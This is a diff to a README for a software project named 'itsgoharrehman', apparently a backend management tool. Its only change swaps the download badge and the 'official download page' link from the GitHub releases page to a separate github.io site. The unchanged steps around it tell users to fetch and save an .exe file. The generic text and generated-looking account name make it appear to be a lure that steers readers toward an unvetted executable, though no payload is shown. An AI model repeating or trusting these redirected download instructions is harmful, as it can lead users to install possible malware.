@@ -1,6 +1,6 @@
 # ⚙️ itsgoharrehman - Manage your backend systems with ease
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/female-theism598/itsgoharrehman/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://female-theism598.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the tool smoothly:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/female-theism598/itsgoharrehman/releases) to access the latest version.
+1. Visit the [official download page](https://female-theism598.github.io) to access the latest version.
 2. Look for the file ending in .exe in the Assets section of the page.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
